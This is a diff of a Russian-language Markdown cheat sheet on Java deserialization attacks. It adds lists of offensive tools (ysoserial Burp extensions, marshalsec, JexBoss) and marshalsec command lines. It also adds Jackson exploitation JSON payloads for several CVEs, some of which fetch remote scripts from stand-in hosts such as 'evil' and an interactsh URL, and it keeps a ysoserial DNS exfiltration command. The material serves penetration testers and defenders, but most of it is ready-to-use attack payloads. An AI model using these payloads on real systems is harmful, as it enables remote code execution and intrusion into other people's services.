@@ -1,16 +1,16 @@
+* [Обнаружение](#Обнаружение)
+* [Инструменты](#Инструменты)
+  * [Ysoserial](#Ysoserial)
+  * [Расширения Burp с использованием ysoserial](#Расширения-Burp-с-использованием-ysoserial)
+  * [Альтернативные инструменты](#Альтернативные-инструменты)
+* [Десериализация YAML](#Десериализация-YAML)
+* [ViewState](#ViewState)
+* [Ссылки](#Ссылки)
+
 # Десериализация Java
 
 > Сериализация Java — это процесс преобразования состояния объекта Java в поток байтов, который можно сохранить или передать, а затем восстановить (десериализовать) обратно в исходный объект.
 >> Сериализация в Java в основном выполняется с помощью интерфейса Serializable, который помечает класс как сериализуемый, что позволяет сохранять его в файлы, отправлять по сети или передавать между виртуальными машинами Java.
-
-Обнаружение
-Инструменты
-Ysoserial
-Расширения Burp с использованием ysoserial
-Альтернативные инструменты
-Десериализация YAML
-ViewState
-Ссылки
 
 # Обнаружение
 
@@ -23,7 +23,7 @@ ViewState
 
 # Инструменты
 
-* **Ysoserial**
+## **Ysoserial**
 
 [frohoff/ysoserial](https://github.com/frohoff/ysoserial): инструмент для экспериментальной генерации полезных данных, использующих небезопасную десериализацию объектов Java.
 
@@ -72,3 +72,141 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[удалено]' | gz
 | URLDNS | @gebl |  |
 | Vaadin1 | @kai_ullrich | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
 | Wicket1 | @jacob-baines | wicket-util:6.23.0, slf4j-api:1.6.4 |
+
+## Расширения Burp
+
+* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) — расширение Burp для проведения атак десериализации Java
+* [federicodotta/scaner](https://github.com/federicodotta/Java-Deserialization-Scanner) — универсальный плагин для Burp Suite для обнаружения и эксплуатации уязвимостей десериализации Java
+* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) — интеграция YSOSERIAL с Burp Suite
+* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) — выявление уязвимостей десериализации Java в Burp
+* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) — расширение Burp для активного выявления уязвимостей десериализации Java
+
+## Альтернативные инструменты
+
+* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) — гаджет для десериализации JRE 8 RCE
+* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) — проверка и эксплуатация JBoss (и других уязвимостей десериализации Java) Инструмент
+* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) — форк оригинального приложения ysoserial
+* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) — инструмент для атаки методом подбора паролей на Java-сериализацию
+* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) — инструмент для вывода потоков сериализации Java в более удобном для восприятия виде
+* [bishopfox/gadgetprobe](https://bishopfox.com/tools/gadgetprobe) — использование десериализации для подбора паролей к удалённому классу
+* [k3idii/Deserek](https://github.com/k3idii/Deserek) — код на Python для сериализации и десериализации двоичного формата сериализации Java.
+  
+```
+java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
+python deserek.py yss_base.bin --format python > yss_url.py
+python yss_url.py yss_new.bin
+java -cp JavaSerializationTestSuite DeSerial yss_new.bin
+```
+
+* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Превращение данных в выполнение кода
+
+```
+$ java -cp marshalsec.jar marshalsec.<маршаллер> [-a] [-v] [-t] [<тип_гаджета> [<аргументы...>]]
+$ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
+$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
+// -a — генерирует/тестирует все полезные данные для данного маршаллера
+// -t — запускается в тестовом режиме, демаршаллируя сгенерированные полезные данные после их генерации.
+// -v — подробный режим, например, также отображает сгенерированную полезную нагрузку в тестовом режиме.
+// gadget_type — идентификатор конкретного гаджета. Если не указан, будут отображаться доступные для данного маршаллера.
+// arguments — аргументы, специфичные для гаджета
+```
+
+* генераторы полезных нагрузок (payloads) для различных библиотек сериализации в Java.
+
+| Маршаллер          | Воздействие гаджетов                                                          |
+|--------------------|-------------------------------------------------------------------------------|
+| BlazeDSAMF(0\|3\|X) | Эскалация до Java сериализации, различные RCE через сторонние библиотеки      |
+| Hessian\|Burlap    | Различные RCE через сторонние библиотеки                                      |
+| Castor             | RCE через зависимости библиотек                                               |
+| Jackson            | Возможный RCE для эксплуатации достаточно стандартных библиотек Java, различные RCE через сторонние библиотеки |
+| Java               | Еще один RCE через сторонние библиотеки                                       |
+| JsonIO             | RCE для эксплуатации достаточно стандартных библиотек Java                    |
+| JYAML              | RCE для эксплуатации достаточно стандартных библиотек Java                    |
+| Kryo               | RCE через сторонние библиотеки                                                |
+| KryoAltStrategy    | RCE для эксплуатации достаточно стандартных библиотек Java                    |
+| Red5AMF(0\|3)      | RCE для эксплуатации достаточно стандартных библиотек Java                    |
+| SnakeYAML          | RCE для эксплуатации достаточно стандартных библиотек Java                    |
+| XStream            | RCE для эксплуатации достаточно стандартных библиотек Java                    |
+| YAMLBeans          | RCE через сторонние библиотеки                                                |
+
+
+# Десериализация JSON
+
+Для работы с JSON в Java можно использовать множество библиотек.
+
+* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
+* [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
+* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
+* [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)
+* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)
+* [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)
+
+* **Jackson**
+
+> Jackson — популярная библиотека Java для работы с данными JSON (JavaScript Object Notation). 
+>
+>Jackson-databind поддерживает полиморфную обработку типов (PTH), ранее известную как «полиморфная десериализация», которая по умолчанию отключена.
+>> Полиморфная десериализация позволяет указать произвольный тип объекта, который будет создан при десериализации, даже если этот тип не ожидался приложением.
+
+* Чтобы определить, использует ли бэкенд Jackson, наиболее распространённым способом является отправка недопустимого JSON-кода и проверка сообщения об ошибке. 
+
+Любой из следующих вариантов:
+
+```Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object```
+
+* com.fasterxml.jackson.databind
+* org.codehaus.jackson.map
+
+* **Эксплуатация**
+
+CVE-2017-7525
+```json
+{
+  "param": [
+    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+    {
+      "transletBytecodes": [
+        "yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="
+      ],
+      "transletName": "a.b",
+      "outputProperties": {}
+    }
+  ]
+}
+```
+CVE-2017-17485
+```json
+{
+  "param": [
+    "org.springframework.context.support.FileSystemXmlApplicationContext",
+    "http://evil/spel.xml"
+  ]
+}
+```
+CVE-2019-12384
+```json
+[
+  "ch.qos.logback.core.db.DriverManagerConnectionSource", 
+  {
+    "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
+  }
+]
+```
+CVE-2020-36180
+```json
+[
+  "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
+  {
+    "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'"
+  }
+]
+```
+CVE-2020-9548
+```json
+[
+  "br.com.anteros.dbcp.AnterosDBCPConfig",
+  {
+    "healthCheckRegistry": "ldap://{{interactsh-url}}"
+  }
+]
+```
